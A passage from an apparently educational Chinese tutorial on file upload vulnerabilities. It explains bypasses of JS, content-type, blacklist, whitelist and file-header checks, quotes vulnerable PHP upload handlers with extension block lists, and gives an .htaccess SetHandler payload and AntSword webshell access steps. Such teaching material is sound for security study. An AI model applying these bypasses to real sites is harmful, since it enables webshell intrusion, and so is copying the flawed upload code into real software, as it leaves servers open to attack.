<p>这里我们用蚁剑做演示：<br>将后门地址和密码输入到蚁剑<br><img src="/image/AntSwort.png" alt="AntSwort"></p>
<p>即可获得最高权限<br><img src="/image/getshell.png" alt="getshell"></p>
<h3 id="5-2-绕过前端-js-检测上传"><a href="#5-2-绕过前端-js-检测上传" class="headerlink" title="5.2 绕过前端 js 检测上传"></a>5.2 绕过前端 js 检测上传</h3><p>在文件上传时，用户选择文件时，或者提交时，有些网站会对前端文件名进行验证，一般检测后缀名，是否为上传的格式。如果上传的格式不对，则弹出提示文字。此时数据包并没有提交到服务器，只是在客户端通过 js 文件进行校验，验证不通过则不会提交到服务器进行处理。<br><img src="/image/上传拦截.png" alt="上传拦截"></p>
<h4 id="5-2-1-绕过-js-检测方法"><a href="#5-2-1-绕过-js-检测方法" class="headerlink" title="5.2.1 绕过 js 检测方法"></a>5.2.1 绕过 js 检测方法</h4><ul>
<li>按 F12 使用网页审计元素，把校验的上传文件后缀名文件删除，即可上传。</li>
<li>把恶意文件改成 js 允许上传的文件后缀，如 jpg、gif、png 等，再通过抓包工具抓取 post 的数据包，把后缀名改成可执行的脚本后缀如 php 、asp、jsp、net 等。即可绕过上传。</li>
</ul>
<p>删除 js 文件（删除检测函数，便可直接上传）<br><img src="/image/删除js检测函数.png" alt="删除js检测函数"></p>
<p>先修改后门文件后缀，改为可上传的文件格式，之后通过抓包修改后缀名<br><img src="/image/修改后缀名.png" alt="修改后缀名"></p>
<h3 id="5-3-绕过-contnet-type-检测上传"><a href="#5-3-绕过-contnet-type-检测上传" class="headerlink" title="5.3 绕过 contnet-type 检测上传"></a>5.3 绕过 contnet-type 检测上传</h3><p>有些上传模块，会对 http 的类型头进行检测，如果是图片类型，允许上传文件到服务器，否则返回上传失败。因为服务端是通过 content-type 判断类型，content-type 在客户端可被修改。则此文件上传也有可能被绕过的风险。</p>
<h4 id="5-3-1-content-type-检测上传攻"><a href="#5-3-1-content-type-检测上传攻" class="headerlink" title="5.3.1 content-type 检测上传攻"></a>5.3.1 content-type 检测上传攻</h4><p>上传文件,脚本文件，抓包把 content-type 修改成 image/jpeg 即可绕过上传。<br><a target="_blank" rel="noopener" href="https://www.runoob.com/http/http-content-type.html">contnet-type 类型</a><br><img src="contnet-type.png" alt="contnet-type"></p>
<h2 id="6-绕过黑名单上传"><a href="#6-绕过黑名单上传" class="headerlink" title="6. 绕过黑名单上传"></a>6. 绕过黑名单上传</h2><p>上传模块，有时候会写成黑名单限制，在上传文件的时获取后缀名，再把后缀名与程序中黑名单进行检测，如果后缀名在黑名单的列表内，文件将禁止文件上传。</p>
<h3 id="6-1-黑名单代码分析"><a href="#6-1-黑名单代码分析" class="headerlink" title="6.1 黑名单代码分析"></a>6.1 黑名单代码分析</h3><p>首先是检测 submit 是否有值，获取文件的后缀名，进行黑名单对比，后缀名不<br>在黑名单内，允许上传。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);    //建立一个黑名单数组用于匹配</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);  // 过滤前后空白</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);     //返回从 . 后的所有字符</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;     //如果不在数组内则进行以下循环</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;   //进行后缀匹配          </span><br><span class="line">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="6-1-1-绕过黑名单上传攻击"><a href="#6-1-1-绕过黑名单上传攻击" class="headerlink" title="6.1.1 绕过黑名单上传攻击"></a>6.1.1 绕过黑名单上传攻击</h4><p>上传图片时，如果提示不允许 php、asp 这种信息提示，可判断为黑名单限制，上传黑名单以外的后缀名即可。</p>
<p>在 iis 里 asp 禁止上传了，可以上传 asa cer cdx 这些后缀，如在网站里允许.net执行 可以上传 ashx 代替 aspx。如果网站可以执行这些脚本，通过上传后门即可获取 webshell。</p>
<p>在不同的中间件中有特殊的情况，如果在 apache 可以开启 application/x-httpd-php 在 AddType application/x-httpd-php .php .phtml .php3 后缀名为 phtml 、php3 均被解析成 php 有的 apache 版本默认就会开启。<br>上传目标中间件可支持的环境的语言脚本即可，如.phtml、php3。<br><img src="/image/phtml.png" alt="phtml"><br>能否上传成功还是要看是否过滤后缀以及 apache 是否开启application/x-httpd-php</p>
<h3 id="6-2-大小写绕过上传攻击"><a href="#6-2-大小写绕过上传攻击" class="headerlink" title="6.2 大小写绕过上传攻击"></a>6.2 大小写绕过上传攻击</h3><p>有的上传模块 后缀名采用黑名单判断，但是没有对后缀名的大小写进行严格判断，导致可以更改后缀大小写可以被绕过。如 PHP、 Php、 phP、pHp</p>
<p>仔细阅读黑名单，查看是否有被忽略的后缀名，当前可以使用 pHP 绕过</p>
<p><img src="/image/pHP.png" alt="pHP"></p>
<h3 id="6-3-空格绕过攻击"><a href="#6-3-空格绕过攻击" class="headerlink" title="6.3 空格绕过攻击"></a>6.3 空格绕过攻击</h3><p>在上传模块里，采用黑名单上传，如果没有对空格进行过滤可能被绕过。</p>
<p>抓包上传，在后缀名后添加空格<br><img src="/image/空白绕过.png" alt="空白绕过"></p>
<h3 id="6-4-利用-windows-系统特征绕过上传攻击"><a href="#6-4-利用-windows-系统特征绕过上传攻击" class="headerlink" title="6.4 利用 windows 系统特征绕过上传攻击"></a>6.4 利用 windows 系统特征绕过上传攻击</h3><p>在 windows中 文件后缀名. 系统会自动忽略.所以 shell.php. 像 shell.php 的效果一样。所以可以在文件名后面机上.绕过。<br>如果没有过滤文件后缀名后的点便可以上传 <code>.php.</code> 这种文件后缀</p>
<p>抓包修改在后缀名后加上<code>.</code>即可绕过。<br><img src="/image/php..png" alt="php."></p>
<h3 id="6-5-NTFS-交换数据流-DATA-绕过上传攻击"><a href="#6-5-NTFS-交换数据流-DATA-绕过上传攻击" class="headerlink" title="6.5 NTFS 交换数据流::$DATA 绕过上传攻击"></a>6.5 NTFS 交换数据流::$DATA 绕过上传攻击</h3><p>如果后缀名没有对::$DATA 进行判断，利用 windows 系统 NTFS 特征可以绕过上传。</p>
<p>如果程序中没有对 <code>::$DATA</code> 进行过滤可以添加<code>::$DATA</code> 绕过上传。</p>
<p>burpsuite 抓包，修改后缀名为 <code>php::$DAT</code><br><img src="NTFS.png" alt="NTFS"></p>
<h3 id="6-6-利用-windows-环境的叠加特征绕过上传"><a href="#6-6-利用-windows-环境的叠加特征绕过上传" class="headerlink" title="6.6 利用 windows 环境的叠加特征绕过上传"></a>6.6 利用 windows 环境的叠加特征绕过上传</h3><p>在 windwos 中如果上传文件名 mortal.php:.jpg 的时候，会在目录下生产空白的文件名 moonsec.php再利用 php 和windows 环境的叠加属性，<br>以下符号在正则匹配时相等<br>双引号<code>&quot;</code>等于 点号<code>.</code>大于符号<code>&gt;</code>等于 问号<code>?</code><br>小于符号<code>&lt;</code>等于 星号<code>*</code><br>文件名<code>.&lt;</code>或文件名<code>.&lt;&lt;&lt;</code>或文件名<code>.&gt;&gt;&gt;</code>或文件名<code>.&gt;&gt;&lt;</code>空文件名</p>
<h4 id="6-6-1-利用-windows-环境的叠加特征绕过"><a href="#6-6-1-利用-windows-环境的叠加特征绕过" class="headerlink" title="6.6.1 利用 windows 环境的叠加特征绕过"></a>6.6.1 利用 windows 环境的叠加特征绕过</h4><p>首先抓包上传 s.php:.jpg 上传会在目录里生成 s.php 空白文件，接着再次提交把<code>s.php</code>改成<code>s.&gt;&gt;&gt;</code></p>
<p>因为 <code>.php</code> 在过滤黑名单内所以需要改为 <code>:.jpg</code> 上传，此时上传的为空脚本<br><img src="/image/环境叠加.png" alt="环境叠加"></p>
<p>再次抓包将 <code>s.php</code> 改为<code>s.&gt;&gt;&gt;</code> 利用 windows 特性将脚本写入<br><img src="/image/写入脚本.png" alt="写入脚本"></p>
<h3 id="6-7-双写后缀名绕过上传"><a href="#6-7-双写后缀名绕过上传" class="headerlink" title="6.7 双写后缀名绕过上传"></a>6.7 双写后缀名绕过上传</h3><p>在上传模块，有的代码会把黑名单的后缀名替换成空，例如 a.php 会把 php 替换成空，但是可以使用双写绕过例如 asaspp，pphphp，即可绕过上传。</p>
<h4 id="6-7-1-文件上传双写绕过漏洞分析"><a href="#6-7-1-文件上传双写绕过漏洞分析" class="headerlink" title="6.7.1 文件上传双写绕过漏洞分析"></a>6.7.1 文件上传双写绕过漏洞分析</h4><p>str_ireplace 对上传的后缀名是黑名单内的字符串转换成空。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);    // 对上传的后缀名是黑名单内的字符串转换成空。</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;        </span><br><span class="line">        if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="6-7-2-文件上传双写绕过攻击"><a href="#6-7-2-文件上传双写绕过攻击" class="headerlink" title="6.7.2 文件上传双写绕过攻击"></a>6.7.2 文件上传双写绕过攻击</h4><p>抓包上传，把后缀名改成<code>pphphp</code>即可绕过上传.<br><img src="/image/双写后缀名.png" alt="双写后缀名"></p>
<h3 id="6-8-htaccess-重写解析绕过上传"><a href="#6-8-htaccess-重写解析绕过上传" class="headerlink" title="6.8 htaccess 重写解析绕过上传"></a>6.8 htaccess 重写解析绕过上传</h3><p>上传模块，黑名单过滤了所有的能执行的后缀名,如果允许上传.htaccess。htaccess文件的作用是 可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定 IP 地址的用户、只允许特定 IP 地址的用户、禁止目录列表，以及使用其他文件作为 index 文件等一些功能。<br>在 htaccess 里写入 SetHandler application/x-httpd-php 则可以文件重写成 php 文件。要 htaccess 的规则生效 则需要在 apache 开启 rewrite 重写模块，因为 apache 是多数都开启这个模块，所以规则一般都生效。</p>
<p>是多数都开启这个模块，所以规则一般都生效。<br><img src="/image/http配置文件.png" alt="http配置文件"></p>
<h4 id="6-8-1-黑名单上传代码分析"><a href="#6-8-1-黑名单上传代码分析" class="headerlink" title="6.8.1 黑名单上传代码分析"></a>6.8.1 黑名单上传代码分析</h4><p>如果 submit 有值，$deny_ext =array(“.php”,”.php5”,”.php4”,”.php3”,”.php2”,”php1”,”.html”,”.htm”,”.phtml”,”.pht”,”.pHp”,”.pHp5”,”.pHp4”,”.pHp3”,”.pHp2”,”pHp1”,”.Html”,”.Htm”,”.pHtml”,”.jsp”,”.jspa”,”.jspx”,”.jsw”,”.jsv”,”.jspf”,”.jtml”,”.jSp”,”.jSpx”,”.jSpa”,”.jSw”,”.jSv”,”.jSpf”,”.jHtml”,”.asp”,”.aspx”,”.asa”,”.asax”,”.ascx”,”.ashx”,”.asmx”,”.cer”,”.aSp”,”.aSpx”,”.aSa”,”.aSax”,”.aScx”,”aShx”,”.aSmx”,”.cEr”,”.sWf”,”.swf”);<br>上传的文件后缀名在列表内禁止上传。包括了所有的执行脚本。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;此文件不允许上传!&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="6-8-2-htaccess-重写解析攻击"><a href="#6-8-2-htaccess-重写解析攻击" class="headerlink" title="6.8.2 htaccess 重写解析攻击"></a>6.8.2 htaccess 重写解析攻击</h4><p>上传<code>.htaccess</code>到网站里<code>.htaccess</code>内容是<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><br>再上传恶意的 jpg 到<code>.htaccess</code>相同目录里，访问图片即可获取执行脚本。<br><img src="/image/htaccess.png" alt="htaccess"></p>
<ul>
<li><strong>注意</strong> 文件名必须为<code>.htaccess</code></li>
</ul>
<p>访问 jpg 图片便可 getshell。<br><img src="/image/htaccess攻击.png" alt="htaccess攻击"></p>
<h3 id="6-9-文件名可控绕过上传"><a href="#6-9-文件名可控绕过上传" class="headerlink" title="6.9 文件名可控绕过上传"></a>6.9 文件名可控绕过上传</h3><p>文件上传时,文件名的可被客户端修改控制,会导致漏洞产生。</p>
<h4 id="6-9-1-文件名控代码分析"><a href="#6-9-1-文件名控代码分析" class="headerlink" title="6.9.1 文件名控代码分析"></a>6.9.1 文件名控代码分析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[&#x27;save_name&#x27;];   //保存文件名并提交</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &#x27;禁止保存为该类型文件！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>采用黑名单限制上传文件,但是 $_POST[‘save_name’]文件是可控的,可被客户端任意修改,造成安全漏洞。</p>
<h4 id="6-9-2-文件名控可控攻击方法"><a href="#6-9-2-文件名控可控攻击方法" class="headerlink" title="6.9.2 文件名控可控攻击方法"></a>6.9.2 文件名控可控攻击方法</h4><p>文件名攻击的方法主要有两种（另外还有一种非主流）</p>
<ol>
<li>上传文件,文件吗采用%00 截断,抓包解码例如 moon.php%00.php 截断后moon.php 或者使用<code>/.</code> <strong>需 php 版本小于 5.3.4</strong></li>
<li>与中间的漏洞配合使用 例如 iis6.0 上传 1.php;1.jpg apache 上传 <code>1.php.a</code> 也能解析文件 <code>a.asp;1.jpg</code> 解析成 <code>asp</code></li>
</ol>
<p><code>%00</code> 截断 需要<code>gpc</code>关闭 抓包 <strong>解码</strong>（需要将%00<strong>decode</strong>成为URL码） 提交即可 截断文件名 <strong>php 版本小于 5.3.4</strong><br><img src="/image/文件可控00截断.png" alt="文件可控00截断"><br>或者改为可以使用 <code>/.</code> 需要没有过滤php版本较低可使用<br><img src="/image/冷门上传.png" alt="冷门上传"></p>
<p>将文件名 1.php;.jpg 改成 iis6.0 可解析文件<br><img src="/image/改为可解析后缀.png" alt="改为iis6可解析后缀"><br><img src="/image/2.ph;.jpeg.png" alt="2.ph;.jpeg"></p>
<p>低版本php可解析后缀<br><img src="/image/可解析后缀.png" alt="可解析后缀"><br><img src="/image/可解析漏洞复现.png" alt="可解析漏洞复现"></p>
<h2 id="7-白名单绕过"><a href="#7-白名单绕过" class="headerlink" title="7. 白名单绕过"></a>7. 白名单绕过</h2><p>使用白名单验证会相对比较安全，因为只允许指定的文件后缀名。但是如果有可控的参数目录，也存在被绕过的风险。</p>
<h3 id="7-1-目录可控-GET-00-截断绕过上传攻击"><a href="#7-1-目录可控-GET-00-截断绕过上传攻击" class="headerlink" title="7.1 目录可控 GET %00 截断绕过上传攻击"></a>7.1 目录可控 GET <code>%00 截断</code>绕过上传攻击</h3><p>代码中使用白名单限制上传的文件后缀名，只允许指定的图片格式。但是$_GET[‘save_path’]服务器接受客户端的值，这个值可被客户端修改。所以会留下安全问题。</p>
<p><strong>上传参数可控</strong></p>
<ul>
<li>当 gpc 关闭的情况下，可以用%00 对目录或者文件名进行截断。</li>
<li><strong>php 版本小于 5.3.4</strong><br>首先截断攻击，抓包上传将<code>%00</code>自动截断后门内容。<br>例如 1.php%00.1.jpg 变成 1.php<br><img src="/image/%00截断.png" alt="%00截断"></li>
</ul>
<h3 id="7-2-目录可控-POST-绕过上传攻击"><a href="#7-2-目录可控-POST-绕过上传攻击" class="headerlink" title="7.2 目录可控 POST 绕过上传攻击"></a>7.2 目录可控 POST 绕过上传攻击</h3><p>上面是 GET 请求的，可以直接在 url 输入%00 即可截断，但是在 post 下直接注入%00 是不行的，需要把%00 解码变成空白符，截断才有效。才能把目录截断成文件名。</p>
<p><code>$_POST[&#39;save_path&#39;]</code>是接收客户端提交的值，客户端可任意修改。所以会产生安全漏洞。</p>
<p>文件名可控，通过抓包修改可控的参数，与不同的中间件的缺陷配合使用。</p>
<ul>
<li>使用%00 截断文件名 再 post 环境下%00 要经过 decode 但是受 gpc 限制使用 burpsutie POST %00 截断文件名。<br><img src="/image/%00decode.png" alt="%00decode"><br><img src="/image/post上传.png" alt="post上传"></li>
</ul>
<h3 id="7-3-文件头检测绕过上传"><a href="#7-3-文件头检测绕过上传" class="headerlink" title="7.3 文件头检测绕过上传"></a>7.3 文件头检测绕过上传</h3><p>有的文件上传，上传时候会检测头文件，不同的文件，头文件也不尽相同。常见的文件上传图片头检测 它检测图片是两个字节的长度，如果不是图片的格式，会禁止上传。</p>
<p>常见的文件头</p>
<ul>
<li><strong>JPEG (jpg)</strong>，文件头：<strong>FFD8FF</strong></li>
<li><strong>PNG (png)</strong>，文件头：<strong>89504E4</strong></li>
<li><strong>GIF (gif)</strong>，文件头：<strong>47494638</strong></li>
<li><strong>TIFF (tif)</strong>，文件头：<strong>49492A00</strong></li>
<li><strong>Windows Bitmap (bmp)</strong>，文件头：<strong>424D</strong></li>
</ul>
<h4 id="7-3-1-文件头检测上传代码分析"><a href="#7-3-1-文件头检测上传代码分析" class="headerlink" title="7.3.1 文件头检测上传代码分析"></a>7.3.1 文件头检测上传代码分析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">function getReailFileType($filename)&#123;</span><br><span class="line">    $file = fopen($filename, &quot;rb&quot;);</span><br><span class="line">    $bin = fread($file, 2); //只读2字节</span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(&quot;C2chars&quot;, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]);    </span><br><span class="line">    $fileType = &#x27;&#x27;;    </span><br><span class="line">    switch($typeCode)&#123;      </span><br><span class="line">        case 255216:            </span><br><span class="line">            $fileType = &#x27;jpg&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        case 13780:            </span><br><span class="line">            $fileType = &#x27;png&#x27;;</span><br><span class="line">            break;        </span><br><span class="line">        case 7173:            </span><br><span class="line">            $fileType = &#x27;gif&#x27;;</span><br><span class="line">            break;</span><br><span class="line">        default:            </span><br><span class="line">            $fileType = &#x27;unknown&#x27;;</span><br><span class="line">        &#125;    </span><br><span class="line">        return $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    if($file_type == &#x27;unknown&#x27;)&#123;</span><br><span class="line">        $msg = &quot;文件未知，上传失败！&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;</span><br><span class="line">        if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = 